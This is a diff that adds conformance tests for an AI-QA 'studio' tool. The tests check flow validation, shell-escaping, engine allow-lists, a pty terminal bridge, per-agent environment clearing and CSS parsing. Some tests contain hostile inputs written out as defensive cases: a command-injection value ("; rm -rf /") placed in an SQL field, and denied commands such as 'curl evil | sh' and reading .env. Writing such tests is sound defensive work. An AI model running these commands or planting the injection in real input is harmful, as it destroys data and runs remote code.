@@ -952,6 +952,395 @@ for (const [label, cmd, args] of [
     `README says the export has ${readmeXlsx && readmeXlsx[1]} honesty mutations; the selftest ran ${xlsxN && xlsxN[1]}`);
 }
 
+// ---- studio: a drawn flow must compile into what the gate reads --------------
+// The canvas is a new way to produce a case, not a new definition of one. So the
+// contract is the same one every other producer answers to: compile a flow, put
+// the result in front of evd_check, and let the gate say whether it is a case.
+{
+  const { compile, validate, toposort, NODE_TYPES, parseExpects } =
+    await import("../src/ui/studio/compile.mjs");
+  const { argvAllowed, safeRel, ALLOWED_TOOLS } = await import("../src/ui/studio/engines.mjs");
+
+  const node = (id, type, data, x = 0, y = 0) => ({ id, type, x, y, data });
+  const apiFlow = (over = {}) => ({
+    version: 1, name: "boundary_at_the_threshold", ticket: "SHOP-142", kind: "boundary", case: 2,
+    title: "An order of exactly 500,000 takes 50,000 off",
+    nodes: [
+      node("a", "actor", { role: "customer, tier gold", account: "zztest@demo" }),
+      node("p", "precondition", { text: "customer 1 exists and is tier gold", check: "none" }),
+      node("o", "api", { method: "POST", path: "/orders", body: '{"customer_id":1}', status: "201",
+        expects: "discount = 50000 | spec 3.2 R1\ntotal = 450000 | spec 3.3" }),
+      node("d", "db", { name: "the stored discount", sql: "SELECT discount FROM orders WHERE note LIKE 'ZZTEST%'", cite: "spec 3.4" }),
+      node("c", "cleanup", { how: "withdraw the order", method: "DELETE", path: "/orders/{{last.id}}" }),
+    ],
+    edges: [{ from: "a", to: "p" }, { from: "p", to: "o" }, { from: "o", to: "d" }, { from: "d", to: "c" }],
+    ...over,
+  });
+  const webFlow = () => ({
+    version: 1, name: "coupon_takes_ten_percent", ticket: "SHOP-142", kind: "acceptance", case: 1,
+    title: "A SAVE10 code takes 50,000 off an order of 500,000",
+    nodes: [
+      node("a", "actor", { role: "customer", account: "zztest@demo" }),
+      node("p", "precondition", { text: "the cart holds 2 items at 250,000", check: "none" }),
+      node("o", "open", { path: "Cart\nCheckout" }),
+      node("t", "type", { selector: "#coupon", value: "SAVE10", why: "apply the code" }),
+      node("k", "click", { selector: "button:has-text('Apply')", why: "apply" }),
+      node("e", "expect", { what: "the Discount line", selector: "#discount", value: "50,000", cite: "spec 3.2 R1" }),
+      node("r", "reload", { what: "the Discount line still reads 50,000" }),
+      node("b", "back", { what: "Back returns to the cart with 2 items" }),
+    ],
+    edges: [{ from: "a", to: "p" }, { from: "p", to: "o" }, { from: "o", to: "t" }, { from: "t", to: "k" },
+            { from: "k", to: "e" }, { from: "e", to: "r" }, { from: "r", to: "b" }],
+  });
+
+  check(validate(apiFlow()).errors.length === 0, `a complete API flow should validate: ${JSON.stringify(validate(apiFlow()).errors)}`);
+  check(validate(webFlow()).errors.length === 0, `a complete web flow should validate: ${JSON.stringify(validate(webFlow()).errors)}`);
+
+  // The rules the gate would enforce later, said before the run instead of after.
+  const errOf = (f) => validate(f).errors.join(" | ");
+  const warnOf = (f) => validate(f).warnings.join(" | ");
+  const drop = (f, id) => ({ ...f, nodes: f.nodes.filter((n) => n.id !== id), edges: f.edges.filter((e) => e.from !== id && e.to !== id) });
+  check(/no AS node/.test(errOf(drop(apiFlow(), "a"))), "a flow with no actor was accepted");
+  check(/Reload check/.test(errOf(drop(webFlow(), "r"))), "a web flow with no reload check was accepted");
+  check(/Back\/Cancel/.test(errOf(drop(webFlow(), "b"))), "a web flow with no Back check was accepted");
+  check(/click path|Open node/.test(errOf(drop(webFlow(), "o"))), "a web flow with no click path was accepted");
+  {
+    const f = apiFlow(); f.nodes.find((n) => n.id === "d").data.sql = "DELETE FROM orders";
+    check(/only reads are allowed/.test(errOf(f)), "a DB node that writes was accepted");
+  }
+  {
+    const f = apiFlow(); f.nodes.find((n) => n.id === "o").data.expects = "discount = works | spec 3.2";
+    check(/judgement, not a value/.test(errOf(f)), "an expected value of \"works\" was accepted");
+  }
+  {
+    const f = apiFlow(); f.nodes.find((n) => n.id === "o").data.expects = "discount = 50000";
+    check(/no citation/.test(warnOf(f)), "an uncited expected value did not warn — it reports a difference, not a defect");
+  }
+  check(/write-readback with no DB read-back/.test(errOf({ ...drop(apiFlow(), "d"), kind: "write-readback" })),
+    "a write-readback flow with no read-back was accepted");
+  check(/no Clean up node/.test(warnOf(drop(apiFlow(), "c"))), "a writing flow with no cleanup did not warn");
+  check(/loop/.test(errOf({ ...apiFlow(), edges: [...apiFlow().edges, { from: "c", to: "a" }] })), "a cycle in the wiring was accepted");
+  check(toposort(apiFlow()).order.map((n) => n.id).join("") === "apodc", "the graph did not walk in dependency order");
+  check(parseExpects("a = 1 | s 1\nb=2").length === 2 && parseExpects("a = 1 | s 1")[0].cite === "s 1", "expected-field lines did not parse");
+
+  // Nothing typed on the canvas may become a command.
+  {
+    const f = apiFlow();
+    f.nodes.find((n) => n.id === "d").data.sql = "SELECT x FROM t WHERE s = 'a'; rm -rf /'";
+    const out = compile(f, { appUrl: "http://127.0.0.1:1", envName: "local" });
+    const sh = out.files[`${out.caseDir}/run.sh`];
+    check(/'\\''/.test(sh), "a quote in a typed value was not escaped for the shell");
+    check(!/;\s*rm -rf \/\s*$/m.test(sh), "a typed value escaped its quoting and became a command");
+    const dbStep = out.steps.find((s) => s.kind === "db");
+    check(dbStep.argv.includes(f.nodes.find((n) => n.id === "d").data.sql), "the SQL was not passed as one argv element");
+  }
+
+  // The compiled cases, in front of the real gate — with the artefacts a real
+  // run leaves behind, because a case marked PASS with no evidence is exactly
+  // what the gate exists to refuse.
+  {
+    const os = await import("node:os");
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "aiqa-studio-"));
+    const write = (rel, text) => { const abs = path.join(dir, rel); fs.mkdirSync(path.dirname(abs), { recursive: true }); fs.writeFileSync(abs, text); };
+    const screen = { ...webFlow(), name: "the_rest_of_checkout_still_works", kind: "whole-screen", case: 3,
+      title: "The rest of checkout still works while a coupon is applied" };
+    for (const [f, no] of [[webFlow(), 1], [apiFlow(), 2], [screen, 3]]) {
+      const out = compile(f, { appUrl: "http://localhost:3000", envName: "local", envUrl: "http://localhost:3000", caseNo: no });
+      for (const [rel, text] of Object.entries(out.files)) write(rel, text);
+      check(/^RESULT: BLOCKED$/m.test(out.manifest), "a compiled case did not start BLOCKED — a plan is not evidence");
+      check(/^REASON:/m.test(out.manifest) && /^UNBLOCK:/m.test(out.manifest), "a BLOCKED case was compiled with no reason or unblock path");
+      check(/^ENVIRONMENT: local/m.test(out.manifest), "the compiled case does not name the environment it targets");
+
+      // …now simulate the run: the same artefacts the studio's runner records.
+      const png = Buffer.from("89504e470d0a1a0a", "hex");
+      if (out.surface === "web" || out.surface === "mixed") {
+        fs.writeFileSync(path.join(dir, out.caseDir, `TC${no}_01_checkout_open.png`), png);
+        fs.writeFileSync(path.join(dir, out.caseDir, `TC${no}_02_discount_line_boxed.png`), png);
+      }
+      for (const st of out.steps.filter((x) => x.kind === "api" || x.kind === "cleanup")) {
+        write(`${st.outDir}/request.http`, "POST /orders\ncontent-type: application/json\n\n{}\n");
+        write(`${st.outDir}/response.json`, '{"status":201,"body":{"discount":50000}}\n');
+      }
+      for (const st of out.steps.filter((x) => x.kind === "db")) write(`${st.outDir}/db_verify.md`, "SELECT discount FROM orders\n-> 50000\n");
+      const rel = `${out.caseDir}/manifest.md`;
+      fs.writeFileSync(path.join(dir, rel), fs.readFileSync(path.join(dir, rel), "utf8")
+        .replace(/^RESULT: BLOCKED$/m, "RESULT: PASS")
+        .replace(/^REASON:.*$\n/m, "").replace(/^UNBLOCK:.*$\n/m, "")
+        .replace(/^ACTUAL: not run yet$/m, "ACTUAL: the Discount line read 50,000 and the stored row held 50,000"));
+    }
+    const ticketDir = "evd/SHOP-142";
+    write(`${ticketDir}/manifest.md`, [
+      "# SHOP-142 — what was checked", "",
+      "COVERAGE:", "- security: n/a — this change is pricing arithmetic; no auth, no data exposure",
+      "- accessibility: TC_1", "", "<!-- ai-qa:index -->", "<!-- /ai-qa:index -->", ""].join("\n"));
+    write(`${ticketDir}/verifysheet.md`, "EXPECTED values, each quoted from spec 3.2 R1.\n");
+    write(`${ticketDir}/debate.md`, "my card\nchallenger card\nresolution\n");
+    write(`${ticketDir}/REPORT.md`, ["# SHOP-142 — PASS", "COMMIT: abc1234", "VERIFIED-AT: 2026-09-10T00:00:00Z",
+      "ENVIRONMENT: local — http://localhost:3000", "ORACLE: docs/spec/discounts.md 3.2", "",
+      "## 1. What was asked for", "An order of exactly 500,000 takes 50,000 off.", "",
+      "## 4. Conclusion", "The requirement is met.", ""].join("\n"));
+    spawnSync("python3", [path.join(pkgRoot, "core/scripts/evd_index.py"), "--evd", path.join(dir, ticketDir)], { encoding: "utf8" });
+    const g = spawnSync("python3", [path.join(pkgRoot, "core/scripts/evd_check.py"), "--evd", path.join(dir, ticketDir), "--expect-tcs", "3"], { encoding: "utf8" });
+    check(g.status === 0, `the evidence gate rejects a pack built from studio flows — the canvas and the gate disagree:\n${g.stdout}${g.stderr}`);
+
+    // …and the same pack without the run's artefacts must still be refused.
+    const bare = fs.mkdtempSync(path.join(os.tmpdir(), "aiqa-studio-bare-"));
+    const out = compile(apiFlow(), { appUrl: "http://localhost:3000", envName: "local", caseNo: 2 });
+    for (const [rel, text] of Object.entries(out.files)) { const abs = path.join(bare, rel); fs.mkdirSync(path.dirname(abs), { recursive: true }); fs.writeFileSync(abs, text); }
+    fs.writeFileSync(path.join(bare, `${out.caseDir}/manifest.md`),
+      fs.readFileSync(path.join(bare, `${out.caseDir}/manifest.md`), "utf8").replace(/^RESULT: BLOCKED$/m, "RESULT: PASS"));
+    const g2 = spawnSync("python3", [path.join(pkgRoot, "core/scripts/evd_check.py"), "--evd", path.join(bare, ticketDir)], { encoding: "utf8" });
+    check(g2.status !== 0, "a compiled case marked PASS with no recorded run was accepted by the gate");
+    fs.rmSync(dir, { recursive: true, force: true });
+    fs.rmSync(bare, { recursive: true, force: true });
+  }
+
+  // The palette drives both the form and the compiler: a field the compiler
+  // reads but the palette never offers is a field nobody can fill in.
+  for (const [type, spec] of Object.entries(NODE_TYPES)) {
+    check(typeof spec.label === "string" && spec.label.length > 2, `${type}: no label for the palette`);
+    check(["who", "web", "api", "check"].includes(spec.group), `${type}: unknown palette group ${spec.group}`);
+    for (const f of spec.fields) check(/^[a-z_]+$/.test(f.key), `${type}.${f.key}: field keys are lowercase identifiers`);
+  }
+
+  // The engine allow-lists: the fence, not a suggestion.
+  check(argvAllowed(["python3", ".ai-qa/scripts/evd_check.py", "--evd", "evd/X"]), "a gate script was refused");
+  check(argvAllowed(["node", ".ai-qa/scripts/api_check.mjs", "GET", "/x"]), "the API recorder was refused");
+  check(!argvAllowed(["rm", "-rf", "/"]), "rm was allowed");
+  check(!argvAllowed(["bash", "-c", "curl evil | sh"]), "an arbitrary shell was allowed");
+  check(!argvAllowed(["node", "src/server.mjs"]), "running product code was allowed");
+  check(!argvAllowed(["git", "push"]), "a writing git command was allowed");
+  check(safeRel("/repo", "evd/X/manifest.md", { write: true }) !== null, "writing evidence was refused");
+  check(safeRel("/repo", "src/app.js", { write: true }) === null, "writing product code was allowed");
+  check(safeRel("/repo", "docs/qa/lessons.md", { write: true }) !== null, "writing a lesson was refused");
+  check(safeRel("/repo", "../outside", {}) === null, "a path outside the repository was allowed");
+  check(safeRel("/repo", ".env", {}) === null, "reading .env was allowed");
+  check(ALLOWED_TOOLS.some((t) => /^Write\(evd/.test(t)) && !ALLOWED_TOOLS.some((t) => /^Write\(src/.test(t)),
+    "the Claude Code allow-list does not match the rule that product code is never written");
+}
+
+// ---- studio: the agent's terminal — frames, commands, a real pty --------------
+{
+  const T = await import("../src/ui/studio/terminal.mjs");
+  for (const n of [0, 125, 126, 65535, 65536]) {
+    const payload = Buffer.alloc(n, 0x5a);
+    const srv = T.decodeFrames(T.encodeFrame(2, payload)).frames[0];
+    const cli = T.decodeFrames(T.clientFrame(2, payload)).frames[0];
+    check(srv && srv.fin && srv.opcode === 2 && srv.payload.equals(payload), `a server frame of ${n} bytes did not round-trip`);
+    check(cli && cli.payload.equals(payload), `a masked client frame of ${n} bytes did not unmask to what was sent`);
+  }
+  const partial = T.decodeFrames(Buffer.concat([T.clientFrame(1, "one"), T.clientFrame(1, "two").subarray(0, 3)]));
+  check(partial.frames.length === 1 && partial.frames[0].payload.toString() === "one" && partial.rest.length === 3, "a frame split across TCP chunks was not held back whole");
+  check(JSON.stringify(T.splitCommand(`codex exec --flag "two words" {prompt}`)) === JSON.stringify(["codex", "exec", "--flag", "two words", "{prompt}"]), "command splitting broke on quotes");
+  // the terminal is the person's shell; the agent is TYPED into it, nothing added
+  const zsh = T.shellFor({ SHELL: "/bin/zsh" });
+  check(zsh.argv.join(" ") === "/bin/zsh -l" && zsh.name === "zsh", `zsh must open as a login shell so PATH is the person's: ${JSON.stringify(zsh)}`);
+  check(T.shellFor({ AIQA_SHELL: "/bin/sh", SHELL: "/bin/zsh" }).argv.join(" ") === "/bin/sh", "AIQA_SHELL did not override the shell");
+  check(T.agentCommand({ id: "claude", cmd: "claude", installed: true }, { model: "opus" }).command === "claude", "the terminal must type exactly the agent's command — no flags, no prompt of the studio's");
+  check(T.agentCommand({ id: "gemini", cmd: "gemini", installed: true }, {}).command === "gemini", "an agent with no adapter is typed as itself");
+  check(T.agentCommand({ id: "codex", cmd: "codex", installed: false, reason: "not on PATH" }, {}).ok === false, "an agent that is not installed was typed anyway");
+  check(T.agentCommand(null, {}).ok === false, "no agent must mean: the shell, and nothing typed");
+  const custom = T.agentCommand({ id: "codex", cmd: "codex", installed: true }, { agent: "codex", customCommand: "codex --full-auto {prompt}" });
+  check(custom.ok && custom.command === "codex --full-auto", "the project's own command was not typed verbatim (minus {prompt})");
+  if (T.availability().available) {
+    // typed after start: the shell receives the command as if a person typed it
+    const typed = new T.TerminalSession({ id: "typed", argv: ["sh"], cwd: pkgRoot, cols: 80, rows: 24, type: "printf typed-ok; exit 5\r", typeDelay: 150 }).start();
+    let tout = ""; const texits = [];
+    typed.on("data", (c) => { tout += c.toString(); }); typed.on("exit", (c) => texits.push(c));
+    const t1 = Date.now(); while (!texits.length && Date.now() - t1 < 8000) await new Promise((r) => setTimeout(r, 20));
+    check(/typed-ok/.test(tout) && texits[0] === 5 && typed.typed === "printf typed-ok; exit 5", `the typed command did not run in the shell: ${JSON.stringify(tout.slice(0, 120))} exit ${texits[0]}`);
+  }
+  if (T.availability().available) {
+    const s = new T.TerminalSession({ id: "t", argv: ["sh", "-c", "printf ready; read x; printf \"got:$x \"; stty size; exit 3"], cwd: pkgRoot, cols: 100, rows: 30 }).start();
+    let out = ""; const exits = [];
+    s.on("data", (c) => { out += c.toString(); }); s.on("exit", (c) => exits.push(c));
+    const until = (re, ms = 8000) => new Promise((res) => { const t0 = Date.now(); const i = setInterval(() => { if (re.test(out) || Date.now() - t0 > ms) { clearInterval(i); res(re.test(out)); } }, 20); });
+    check(await until(/ready/), `the pty bridge never printed the prompt: ${JSON.stringify(out)}`);
+    s.resize(80, 24); s.write("hi\n");
+    check(await until(/got:hi/), `input typed into the pty did not reach the program: ${JSON.stringify(out)}`);
+    check(await until(/24 80/), `a resize did not reach the pty (stty size said ${JSON.stringify(out.match(/\d+ \d+/)?.[0])})`);
+    const t0 = Date.now(); while (!exits.length && Date.now() - t0 < 8000) await new Promise((r) => setTimeout(r, 20));
+    check(exits[0] === 3, `the program's exit code did not come back through the bridge (${exits[0]})`);
+    check(s.replay().toString().includes("got:hi"), "the replay buffer does not hold what the pty printed");
+  }
+}
+
+
+// ---- the terminal's per-agent profiles ---------------------------------------
+// Three agents, three different needs, and the failure mode of getting this
+// wrong is silent: a terminal that opens in a state its agent did not expect.
+{
+  const agentsMod = await import("../src/ui/studio/agents.mjs");
+  const { PROFILES, DEFAULT_PROFILE, LANE_MARKERS, profileFor, terminalEnv, laneStatus, hygieneText } = agentsMod;
+
+  // Claude Code's markers were read off a live session. The two that matter
+  // most address the PARENT session; inheriting them is the bug this fixes.
+  const claudeSession = {
+    PATH: "/usr/bin", HOME: "/home/x",
+    CLAUDECODE: "1",
+    CLAUDE_CODE_CHILD_SESSION: "1",
+    CLAUDE_CODE_MESSAGING_SOCKET: "/tmp/parent.sock",
+    CLAUDE_CODE_MESSAGING_TOKEN: "parent-token",
+    CLAUDE_CODE_SESSION_ID: "parent-session",
+    CLAUDE_CODE_ENTRYPOINT: "cli",
+    CLAUDE_PID: "123",
+    CLAUDE_EFFORT: "high",
+    CLAUDE_CODE_ENABLE_TELEMETRY: "1",
+    ANTHROPIC_API_KEY: "sk-keep-me",
+  };
+  {
+    const { env, cleared } = terminalEnv("claude", claudeSession);
+    for (const gone of ["CLAUDECODE", "CLAUDE_CODE_CHILD_SESSION", "CLAUDE_CODE_MESSAGING_SOCKET",
+                        "CLAUDE_CODE_MESSAGING_TOKEN", "CLAUDE_CODE_SESSION_ID", "CLAUDE_PID"]) {
+      check(!(gone in env), `claude terminal inherited ${gone} — a fresh terminal must not address the parent session`);
+      check(cleared.includes(gone), `${gone} was removed but not reported in cleared[]`);
+    }
+    // Preferences and credentials are NOT session markers.
+    check(env.CLAUDE_CODE_ENABLE_TELEMETRY === "1", "a telemetry preference was cleared — that is the person's setting, not this session's state");
+    check(env.ANTHROPIC_API_KEY === "sk-keep-me", "a credential was cleared from the terminal environment");
+    check(env.PATH === "/usr/bin" && env.HOME === "/home/x", "terminalEnv damaged the ordinary environment");
+  }
+
+  // A shell that was never started from inside an agent has nothing to clear,
+  // and must not pretend otherwise.
+  {
+    const { cleared } = terminalEnv("claude", { PATH: "/usr/bin" });
+    check(cleared.length === 0, `nothing was inherited, yet cleared[] claims ${JSON.stringify(cleared)}`);
+    check(/not started from inside/.test(hygieneText("claude", cleared)),
+      "the hygiene line should say plainly that there was nothing to clear");
+  }
+
+  // `keep` beats `clear`. This is the whole reason there are two lists: a
+  // config pointer that looks like a session marker must survive.
+  {
+    const withBoth = { ...agentsMod.PROFILES };
+    // Use the real codex profile: CODEX_HOME is config, and must never go.
+    const { env } = terminalEnv("codex", { CODEX_HOME: "/home/x/.codex", OPENAI_API_KEY: "sk-x" });
+    check(env.CODEX_HOME === "/home/x/.codex",
+      "CODEX_HOME was cleared — it points at the person's own config, not at a session");
+    check(env.OPENAI_API_KEY === "sk-x", "a credential was cleared for codex");
+    void withBoth;
+  }
+  {
+    // Synthetic: a name in BOTH lists survives, whatever the profile says.
+    const both = { clear: ["X_THING"], keep: ["X_THING"], verified: false, note: "", lane: null };
+    const saved = PROFILES.__test__;
+    PROFILES.__test__ = both;
+    const { env, cleared } = terminalEnv("__test__", { X_THING: "keep me" });
+    check(env.X_THING === "keep me", "keep did not win over clear");
+    check(cleared.length === 0, "a kept name was reported as cleared");
+    if (saved === undefined) delete PROFILES.__test__; else PROFILES.__test__ = saved;
+  }
+
+  // Honesty: an unverified profile claims NO session markers rather than
+  // inventing plausible ones.
+  for (const id of ["codex", "gemini", "cursor", "copilot"]) {
+    check(PROFILES[id].verified === false, `${id} is marked verified — was a real session actually inspected?`);
+    check(PROFILES[id].clear.length === 0,
+      `${id} is unverified but claims session markers ${JSON.stringify(PROFILES[id].clear)} — that is an invented value`);
+  }
+  check(PROFILES.claude.verified === true, "claude's markers were read off a live session and should be marked verified");
+  check(DEFAULT_PROFILE.clear.length === 0 && DEFAULT_PROFILE.lane === null,
+    "the fallback profile must claim nothing");
+  check(profileFor("nope") === DEFAULT_PROFILE, "an unknown agent should fall back, not throw");
+
+  // Gemini has no adapter in this repo. The profile must say so instead of
+  // implying the workflows are there.
+  check(PROFILES.gemini.lane === null, "gemini has no ai-qa adapter; its profile must not name a lane marker");
+  check(/NOT installed|no adapter/i.test(PROFILES.gemini.note),
+    "gemini's note should say the lane is not installed for it");
+
+  // DRIFT GUARD: every lane marker must be the marker an adapter really writes.
+  // Without this the profile quietly starts pointing at a path nothing creates.
+  for (const [agentId, marker] of Object.entries(LANE_MARKERS)) {
+    const tool = agentId === "claude" ? "claude-code" : agentId;
+    const src = fs.readFileSync(path.join(pkgRoot, "adapters", `${tool}.mjs`), "utf8");
+    const m = /export const marker = "([^"]+)"/.exec(src);
+    check(!!m, `adapters/${tool}.mjs exports no marker`);
+    check(m && m[1] === marker,
+      `LANE_MARKERS.${agentId} is ${JSON.stringify(marker)} but adapters/${tool}.mjs writes ${JSON.stringify(m && m[1])}`);
+  }
+
+  // laneStatus tells three different problems apart.
+  {
+    const tmpL = fs.mkdtempSync(path.join(process.env.TMPDIR || "/tmp", "aiqa-lane-"));
+    check(laneStatus("gemini", tmpL).state === "none", "gemini should report state 'none' — there is no adapter");
+    check(laneStatus("claude", tmpL).state === "missing", "an uninitialised project should report 'missing'");
+    check(/ai-qa init|ai-qa update/.test(laneStatus("claude", tmpL).text),
+      "the 'missing' message should name the command that fixes it");
+    fs.mkdirSync(path.join(tmpL, ".claude", "skills", "qa"), { recursive: true });
+    fs.writeFileSync(path.join(tmpL, ".claude", "skills", "qa", "SKILL.md"), "x");
+    check(laneStatus("claude", tmpL).state === "present", "an installed lane should report 'present'");
+    fs.rmSync(tmpL, { recursive: true, force: true });
+  }
+
+  // Every profile a person can pick must carry a one-line explanation.
+  for (const [id, p] of Object.entries(PROFILES)) {
+    check(typeof p.note === "string" && p.note.length > 20, `${id}: profile note is too short to be useful`);
+    check(Array.isArray(p.keep), `${id}: profile has no keep list`);
+  }
+}
+
+
+// ---- CSS: a rule that never reaches the browser ------------------------------
+// A deletion once removed two selector LINES and left their declaration bodies
+// behind. CSS error recovery then hunted for the next `{` — and found the one
+// belonging to `#tab-canvas`, swallowing the rule that makes the Steps tab a
+// three-column grid. Nothing threw. The stylesheet still loaded. The tab just
+// silently became one column, palette full width and canvas 16px tall.
+//
+// The tell is precise: a top-level prelude containing `;` means declarations
+// leaked out of a block. Brace balance alone would not have caught it either,
+// because the stray `}` characters kept the count plausible.
+{
+  const cssFiles = ["src/ui/studio/app.css"];   // vendor CSS is not ours to police
+  for (const rel of cssFiles) {
+    const raw = fs.readFileSync(path.join(pkgRoot, rel), "utf8");
+    const css = raw.replace(/\/\*[\s\S]*?\*\//g, " ");   // comments out
+
+    let depth = 0, prelude = "", opens = 0, closes = 0;
+    const orphans = [];
+    const selectors = [];
+    for (let i = 0; i < css.length; i++) {
+      const ch = css[i];
+      if (ch === "{") {
+        opens++;
+        if (depth === 0) {
+          const sel = prelude.trim();
+          if (!sel) orphans.push("(empty prelude)");
+          else if (sel.includes(";")) orphans.push(sel.replace(/\s+/g, " ").slice(0, 90));
+          else selectors.push(sel.replace(/\s+/g, " "));
+          prelude = "";
+        }
+        depth++;
+        continue;
+      }
+      if (ch === "}") { closes++; depth = Math.max(0, depth - 1); if (depth === 0) prelude = ""; continue; }
+      if (depth === 0) prelude += ch;
+    }
+
+    check(opens === closes, `${rel}: ${opens} '{' vs ${closes} '}' — the stylesheet does not balance`);
+    check(orphans.length === 0,
+      `${rel}: ${orphans.length} block(s) whose selector was lost, so the browser drops the NEXT rule too: ${JSON.stringify(orphans.slice(0, 2))}`);
+    check(depth === 0, `${rel}: a block is never closed`);
+
+    // The layout the Steps tab depends on must actually survive parsing.
+    const has = (sel) => selectors.some((s) => s === sel || s.split(",").map((x) => x.trim()).includes(sel));
+    for (const sel of ["#tab-canvas", "#tab-canvas.on", ".palette", ".canvas-wrap", ".inspector"]) {
+      check(has(sel), `${rel}: the rule for ${sel} is missing — the Steps tab needs it to lay out`);
+    }
+    const gridRule = /#tab-canvas\s*\{[^}]*grid-template-columns\s*:[^}]*\}/.test(css);
+    check(gridRule, `${rel}: #tab-canvas has no grid-template-columns — the Steps tab collapses to one column without it`);
+
+    // Every custom property the file uses must be one the file defines.
+    const defined = new Set([...css.matchAll(/(--[a-z0-9-]+)\s*:/g)].map((m) => m[1]));
+    const used = new Set([...css.matchAll(/var\((--[a-z0-9-]+)/g)].map((m) => m[1]));
+    const undef = [...used].filter((v) => !defined.has(v));
+    check(undef.length === 0,
+      `${rel}: uses custom properties it never defines: ${JSON.stringify(undef)} — a var() that resolves to nothing drops the whole declaration`);
+  }
+}
+
 // ---- report -------------------------------------------------------------------
 if (fails.length) {
   console.error(`conformance: ${fails.length} FAILED of ${checks} checks\n`);
